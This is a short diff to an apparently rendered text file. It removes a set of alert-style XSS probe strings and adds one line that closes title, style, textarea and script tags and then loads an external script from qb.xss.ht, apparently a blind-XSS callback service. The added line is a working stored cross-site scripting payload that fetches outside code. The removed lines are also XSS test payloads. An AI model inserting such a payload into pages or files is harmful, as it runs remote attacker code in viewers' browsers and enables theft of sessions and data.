@@ -1,8 +1,1 @@
-# -b-
-<b>test</b>test
-  <img src="x&quot;" onerror=alert(1)>
-  <script>alert(1)</script>
-  <img src=x onmouseover="alert('xxs')">
-<'';!--"<<XSS>=&{()}
-<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>t
-&#34
+'>"></title></style></textarea></script><script/src=https://qb.xss.ht></script>
